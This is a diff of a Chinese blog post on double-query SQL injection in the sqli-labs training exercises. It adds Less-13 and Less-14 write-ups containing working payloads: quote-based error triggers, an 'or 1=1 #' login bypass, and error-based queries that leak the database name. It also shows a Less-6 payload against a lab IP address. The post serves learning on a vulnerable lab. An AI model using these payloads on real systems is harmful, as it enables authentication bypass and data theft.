@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="Sqli-labs学习记录系列之Less5-6。介绍了双查询注入的原理以及在sqli-labs题目上的应用。">
+<meta name="description" content="Sqli-labs学习记录系列之Less5-6，以及Less13-14。介绍了双查询注入的原理以及在sqli-labs题目上的应用。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入之Double Query">
 <meta property="og:url" content="http://yoursite.com/2018/12/17/SQL注入之Double Query/index.html">
 <meta property="og:site_name" content="Angie&#39;s blog">
-<meta property="og:description" content="Sqli-labs学习记录系列之Less5-6。介绍了双查询注入的原理以及在sqli-labs题目上的应用。">
+<meta property="og:description" content="Sqli-labs学习记录系列之Less5-6，以及Less13-14。介绍了双查询注入的原理以及在sqli-labs题目上的应用。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-01-05T05:25:37.677Z">
+<meta property="og:updated_time" content="2019-01-23T13:42:36.670Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入之Double Query">
-<meta name="twitter:description" content="Sqli-labs学习记录系列之Less5-6。介绍了双查询注入的原理以及在sqli-labs题目上的应用。">
+<meta name="twitter:description" content="Sqli-labs学习记录系列之Less5-6，以及Less13-14。介绍了双查询注入的原理以及在sqli-labs题目上的应用。">
 
 
 
@@ -308,7 +308,7 @@
 
           
               <div class="post-description">
-                  Sqli-labs学习记录系列之Less5-6。介绍了双查询注入的原理以及在sqli-labs题目上的应用。
+                  Sqli-labs学习记录系列之Less5-6，以及Less13-14。介绍了双查询注入的原理以及在sqli-labs题目上的应用。
               </div>
           
 
@@ -340,6 +340,17 @@
 <p>依据上述公式替换爆数据语句即可获取数据库信息。</p>
 <h2 id="Less-6-Double-Query-Double-Quotes-String"><a href="#Less-6-Double-Query-Double-Quotes-String" class="headerlink" title="Less-6 Double Query -Double Quotes-String"></a>Less-6 Double Query -Double Quotes-String</h2><p>这题和上一题是一样的思路，只是变成了双引号的。。</p>
 <p>套用公式，payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-6/?id=1&quot; union select  1 from (select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b--+``</span><br></pre></td></tr></table></figure></p>
+<h1 id="Less-13-Double-Injection-String-with-twist"><a href="#Less-13-Double-Injection-String-with-twist" class="headerlink" title="Less-13 Double Injection- String- with twist"></a>Less-13 Double Injection- String- with twist</h1><p>网上很多拿了盲注做的。但我觉得从题目信息看起来应该本意是用Sql注入双查询注入做。（不过方法很多，能做出来就好啦。）</p>
+<p>这里我拿双注入查询做了。<br><strong>判断：</strong><br><code>uname=test&#39; &amp; passwd=test</code><br>返回信息：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘test’) LIMIT 0,1’ at line 1</p>
+<p>去掉单引号左右：<br>test’) LIMIT 0,1</p>
+<p>构造Payload:<br><code>uname=test&#39;) or 1=1 # &amp; passwd=test</code><br>这里就返回登录成功了。</p>
+<p>根据以上介绍的公式，开始爆数据库信息。<br><strong>爆数据库信息：</strong><br><code>uname=test&#39;) union select 1 from (select count(*),concat(floor(rand(0)*2),(database()))a from information_schema.tables group by a)b # &amp; passwd=test</code></p>
+<h1 id="Less14-Double-Injection-Double-quotes-String"><a href="#Less14-Double-Injection-Double-quotes-String" class="headerlink" title="Less14 Double Injection- Double quotes- String"></a>Less14 Double Injection- Double quotes- String</h1><p>和Less13大同小异，变成了双引号。</p>
+<p><strong>判断：</strong><br><code>uname=test&quot; &amp; passwd=test</code></p>
+<p>返回信息：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘test” LIMIT 0,1’ at line 1</p>
+<p><strong>payload:</strong><br><code>uname=test&quot; or 1=1 #&amp; passwd=test</code></p>
+<p>此时页面返回登录成功。</p>
+<p><strong>爆数据库语句：</strong><br><code>uname=test&quot; union select 1 from (select count(*),concat(floor(rand(0)*2),(database()))a from information_schema.tables group by a)b #&amp; passwd=test</code></p>
 
       
     </div>
@@ -512,7 +523,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-原理"><span class="nav-number">1.</span> <span class="nav-text">0x00 原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Query原理分析"><span class="nav-number">1.1.</span> <span class="nav-text">Double Query原理分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Sqli-labs"><span class="nav-number">2.</span> <span class="nav-text">0x01 Sqli-labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5-Double-Query-Single-Quote-String"><span class="nav-number">2.1.</span> <span class="nav-text">Less-5 Double Query- Single Quote -String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6-Double-Query-Double-Quotes-String"><span class="nav-number">2.2.</span> <span class="nav-text">Less-6 Double Query -Double Quotes-String</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-原理"><span class="nav-number">1.</span> <span class="nav-text">0x00 原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Query原理分析"><span class="nav-number">1.1.</span> <span class="nav-text">Double Query原理分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Sqli-labs"><span class="nav-number">2.</span> <span class="nav-text">0x01 Sqli-labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5-Double-Query-Single-Quote-String"><span class="nav-number">2.1.</span> <span class="nav-text">Less-5 Double Query- Single Quote -String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6-Double-Query-Double-Quotes-String"><span class="nav-number">2.2.</span> <span class="nav-text">Less-6 Double Query -Double Quotes-String</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-13-Double-Injection-String-with-twist"><span class="nav-number">3.</span> <span class="nav-text">Less-13 Double Injection- String- with twist</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less14-Double-Injection-Double-quotes-String"><span class="nav-number">4.</span> <span class="nav-text">Less14 Double Injection- Double quotes- String</span></a></li></ol></div>
             
 
           </div>
